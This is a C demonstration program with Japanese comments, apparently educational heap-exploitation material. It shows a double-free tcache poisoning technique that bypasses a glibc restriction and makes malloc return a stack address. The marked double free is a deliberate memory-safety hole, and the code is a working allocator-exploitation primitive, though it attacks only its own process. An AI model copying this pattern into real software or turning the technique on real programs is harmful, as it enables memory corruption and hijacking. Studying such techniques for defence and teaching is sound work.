#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>


int main()
{
    /*
     * この攻撃は、次のコミットで導入された制限を回避するものです。
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * libc にこの制限が含まれていなければ、victim を単純にdouble freeして、
     * 単純な tcache poisoning を行えます。
     * また、この技法の変わった名前について、@anton00b と @subwire に感謝します */

    // _IO_FILE がヒープに干渉しないよう、バッファリングを無効にします
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // 導入
    puts("このファイルは、malloc をだまして");
    puts("任意の場所(このデモではスタック)へのポインタを返させる、強力な tcache poisoning 攻撃を示します。");
    puts("この攻撃はdouble free のみに依存します。\n");

    // 対象を準備します
    intptr_t stack_var[4];
    puts("malloc() に返させたいアドレス、すなわち");
    printf("対象アドレスは %p です。\n\n", stack_var);

    // ヒープのレイアウトを準備します
    puts("ヒープのレイアウトを準備します");
    puts("後で tcache のリストを埋めるために、0x10 個のチャンク (malloc(0x100)) を確保します。");
    intptr_t *x[0x10];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    printf("後で併合 (consolidation) するためのチャンクを確保します: prev @ %p\n", prev);
    intptr_t *a = malloc(0x100);
    printf("victim となるチャンクを確保します: a @ %p\n", a);
    puts("併合を防ぐためのパディングを確保します。\n");
    malloc(0x10);

    // チャンクの重なり (overlapping) を引き起こします
    puts("これでチャンクの重なりを引き起こせます");
    puts("ステップ 1: tcache のリストを埋めます");
    for(int i=0; i<0x10; i++){
        free(x[i]);
    }
    puts("ステップ 2: victim チャンクを解放して、unsorted bin に追加します");
    free(a);

    puts("ステップ 3: 直前のチャンクを解放し、victim チャンクと併合させます。");
    free(prev);

    puts("ステップ 4: tcache のリストから 1 つ取り出して、victim をもう一度解放し、victim チャンクを tcache のリストに追加します\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a はすでに解放済みです
    /*VULNERABILITY*/

    puts("これでチャンクの重なりというプリミティブ (primitive) が得られました:");
    puts("このプリミティブにより、オブジェクトやヒープのメタデータなどを直接読み書きできます。\n");
    puts("以下では、チャンクの重なりというプリミティブを使って tcache poisoning 攻撃を行います。");

    puts("unsorted bin から、重なっているチャンクを取得します。");
    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
    puts("重なっているチャンクを使って、victim->next ポインタを制御します。");
    // glibc 2.32 以降はポインタを mangle します
    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;

    puts("tcache から victim チャンクを取り戻します。これにより、対象が tcache の先頭に置かれます。");
    a = malloc(0x100);
    int a_size = a[-1] & 0xff0;
    printf("victim @ %p、サイズ: %#x、終端 @ %p\n", a, a_size, (void *)a+a_size);

    puts("tcache から対象のチャンクを取得します。");
    intptr_t *target = malloc(0x100);
    target[0] = 0xcafebabe;

    printf("target @ %p == stack_var @ %p\n", target, stack_var);
    assert(stack_var[0] == 0xcafebabe);
    return 0;
}
